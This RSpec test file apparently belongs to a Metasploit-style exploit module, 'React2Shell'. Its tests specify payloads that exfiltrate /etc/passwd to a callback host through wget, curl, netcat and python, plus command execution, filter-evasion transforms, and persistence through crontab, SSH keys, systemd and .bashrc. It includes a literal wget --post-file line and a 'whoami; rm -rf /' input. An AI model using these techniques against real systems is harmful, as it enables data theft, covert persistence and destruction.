# frozen_string_literal: true

require 'spec_helper'
require 'react2shell/payload_evasion'

RSpec.describe React2Shell::PayloadEvasion do
  let(:msf_module) { 
    double('MSF Module', 
      datastore: { 'VERBOSE' => false },
      print_status: nil,
      print_warning: nil,
      print_error: nil,
      vprint_status: nil
    ) 
  }
  let(:payload_evasion) { described_class.new(msf_module) }
  let(:oob_url) { 'http://192.168.1.50:8080/callback' }
  let(:filepath) { '/etc/passwd' }
  let(:command) { 'whoami' }

  describe '#initialize' do
    it 'initializes with MSF module' do
      expect(payload_evasion.error_handler).to be_a(React2Shell::ErrorHandler)
    end

    it 'initializes without MSF module' do
      evasion = described_class.new
      expect(evasion.error_handler).to be_nil
    end
  end

  describe '#create_adaptive_file_exfiltration_payload' do
    it 'returns multiple alternative payloads' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads).to all(be_a(String))
    end

    it 'includes wget payload as first option' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      expect(payloads.first).to include('wget')
      expect(payloads.first).to include('--post-file')
      expect(payloads.first).to include(filepath)
    end

    it 'includes curl alternative' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      curl_payload = payloads.find { |p| p.include?('curl') }
      expect(curl_payload).not_to be_nil
      expect(curl_payload).to include('--data-binary')
    end

    it 'includes netcat alternative' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      nc_payload = payloads.find { |p| p.include?('nc') }
      expect(nc_payload).not_to be_nil
      expect(nc_payload).to include('cat')
    end

    it 'includes python alternatives' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      python_payloads = payloads.select { |p| p.include?('python') }
      expect(python_payloads.length).to be >= 2 # python and python3
    end

    it 'applies evasion techniques when requested' do
      options = { evasion: [:case_variation, :whitespace_variation] }
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url, options)
      
      # Should have more payloads due to evasion variants
      normal_payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      expect(payloads.length).to be > normal_payloads.length
    end

    it 'handles stealth mode' do
      options = { stealth: true }
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url, options)
      
      # Stealth payloads should include quiet flags
      wget_payload = payloads.find { |p| p.include?('wget') }
      expect(wget_payload).to include('-q') if wget_payload
      
      curl_payload = payloads.find { |p| p.include?('curl') }
      expect(curl_payload).to include('-s') if curl_payload
    end
  end

  describe '#create_adaptive_command_execution_payload' do
    it 'returns multiple alternative payloads' do
      payloads = payload_evasion.create_adaptive_command_execution_payload(command, oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads).to all(be_a(String))
    end

    it 'includes bash + wget as primary method' do
      payloads = payload_evasion.create_adaptive_command_execution_payload(command, oob_url)
      
      expect(payloads.first).to include('bash')
      expect(payloads.first).to include('wget')
      expect(payloads.first).to include(command)
    end

    it 'includes curl alternative' do
      payloads = payload_evasion.create_adaptive_command_execution_payload(command, oob_url)
      
      curl_payload = payloads.find { |p| p.include?('curl') }
      expect(curl_payload).not_to be_nil
      expect(curl_payload).to include(command)
    end

    it 'includes python alternatives' do
      payloads = payload_evasion.create_adaptive_command_execution_payload(command, oob_url)
      
      python_payloads = payloads.select { |p| p.include?('python') }
      expect(python_payloads.length).to be >= 1
    end

    it 'properly escapes command parameters' do
      dangerous_command = "whoami; rm -rf /"
      payloads = payload_evasion.create_adaptive_command_execution_payload(dangerous_command, oob_url)
      
      # All payloads should contain the command in some form (escaped or quoted)
      payloads.each do |payload|
        expect(payload).to include(dangerous_command) # Command should be present
        expect(payload).to be_a(String)
        expect(payload).not_to be_empty
      end
    end
  end

  describe '#apply_evasion_techniques' do
    let(:original_payload) { "wget --post-file=/etc/passwd http://example.com" }

    it 'applies case variation' do
      result = payload_evasion.apply_evasion_techniques([original_payload], [:case_variation])
      
      expect(result.length).to be > 1
      # Should have original plus case-varied version
      case_varied = result.find { |p| p != original_payload && p.downcase == original_payload.downcase }
      expect(case_varied).not_to be_nil
    end

    it 'applies comment injection' do
      result = payload_evasion.apply_evasion_techniques([original_payload], [:comment_injection])
      
      expect(result.length).to be > 1
      comment_injected = result.find { |p| p.include?('#') }
      expect(comment_injected).not_to be_nil
    end

    it 'applies whitespace variation' do
      result = payload_evasion.apply_evasion_techniques([original_payload], [:whitespace_variation])
      
      expect(result.length).to be > 1
      # Should have different whitespace patterns
      whitespace_varied = result.find { |p| p != original_payload && p.gsub(/\s+/, ' ') == original_payload.gsub(/\s+/, ' ') }
      expect(whitespace_varied).not_to be_nil
    end

    it 'applies multiple techniques' do
      techniques = [:case_variation, :whitespace_variation, :comment_injection]
      result = payload_evasion.apply_evasion_techniques([original_payload], techniques)
      
      # Should have original plus multiple variations
      expect(result.length).to be >= techniques.length + 1
    end

    it 'returns original payloads plus variations' do
      result = payload_evasion.apply_evasion_techniques([original_payload], [:case_variation])
      
      expect(result).to include(original_payload)
      expect(result.length).to be > 1
    end
  end

  describe '#create_persistence_payload' do
    it 'returns multiple persistence methods' do
      payloads = payload_evasion.create_persistence_payload(oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads).to all(be_a(String))
    end

    it 'includes cron-based persistence' do
      payloads = payload_evasion.create_persistence_payload(oob_url)
      
      cron_payload = payloads.find { |p| p.include?('crontab') }
      expect(cron_payload).not_to be_nil
    end

    it 'includes SSH key persistence' do
      payloads = payload_evasion.create_persistence_payload(oob_url)
      
      ssh_payload = payloads.find { |p| p.include?('authorized_keys') }
      expect(ssh_payload).not_to be_nil
    end

    it 'includes systemd service persistence' do
      payloads = payload_evasion.create_persistence_payload(oob_url)
      
      systemd_payload = payloads.find { |p| p.include?('systemctl') }
      expect(systemd_payload).not_to be_nil
    end

    it 'includes profile persistence' do
      payloads = payload_evasion.create_persistence_payload(oob_url)
      
      profile_payload = payloads.find { |p| p.include?('.bashrc') }
      expect(profile_payload).not_to be_nil
    end

    it 'accepts custom options' do
      options = { service_name: 'custom-service', ssh_key: 'custom-key' }
      payloads = payload_evasion.create_persistence_payload(oob_url, options)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
    end
  end

  describe '#detect_environment_restrictions' do
    it 'returns detection results hash' do
      result = payload_evasion.detect_environment_restrictions
      
      expect(result).to be_a(Hash)
      expect(result).to have_key(:blocked_commands)
      expect(result).to have_key(:available_commands)
      expect(result).to have_key(:shell_type)
      expect(result).to have_key(:has_internet)
      expect(result).to have_key(:waf_detected)
    end

    it 'categorizes commands correctly' do
      test_commands = ['wget', 'curl', 'nonexistent_command']
      result = payload_evasion.detect_environment_restrictions(test_commands)
      
      expect(result[:available_commands]).to include('wget', 'curl')
      expect(result[:blocked_commands]).to include('nonexistent_command')
    end

    it 'detects shell type' do
      result = payload_evasion.detect_environment_restrictions
      
      expect(result[:shell_type]).to be_a(Symbol)
    end
  end

  describe 'error handling' do
    let(:error_handler) { double('ErrorHandler') }
    
    before do
      allow(React2Shell::ErrorHandler).to receive(:new).and_return(error_handler)
      allow(error_handler).to receive(:handle_payload_error)
    end

    it 'handles errors in file exfiltration payload creation' do
      allow(payload_evasion).to receive(:create_wget_payload).and_raise(StandardError, 'Test error')
      
      expect(error_handler).to receive(:handle_payload_error)
      
      expect {
        payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      }.to raise_error(StandardError, 'Test error')
    end

    it 'handles errors in command execution payload creation' do
      allow(payload_evasion).to receive(:create_bash_wget_command_payload).and_raise(StandardError, 'Test error')
      
      expect(error_handler).to receive(:handle_payload_error)
      
      expect {
        payload_evasion.create_adaptive_command_execution_payload(command, oob_url)
      }.to raise_error(StandardError, 'Test error')
    end
  end

  describe 'payload validation' do
    it 'generates syntactically valid payloads' do
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      payloads.each do |payload|
        expect(payload).not_to be_empty
        expect(payload).to be_a(String)
        # Basic syntax check - should not have unmatched quotes
        expect(payload.count("'")).to be_even
      end
    end

    it 'properly escapes special characters in file paths' do
      special_filepath = "/tmp/file with spaces & special chars"
      payloads = payload_evasion.create_adaptive_file_exfiltration_payload(special_filepath, oob_url)
      
      payloads.each do |payload|
        # Should wrap the filepath in quotes to handle special characters
        expect(payload).to include("'#{special_filepath}'")
      end
    end

    it 'properly escapes special characters in commands' do
      special_command = "echo 'hello world' && whoami"
      payloads = payload_evasion.create_adaptive_command_execution_payload(special_command, oob_url)
      
      payloads.each do |payload|
        # Should properly handle the command with quotes and operators
        expect(payload).to be_a(String)
        expect(payload).not_to be_empty
      end
    end
  end
end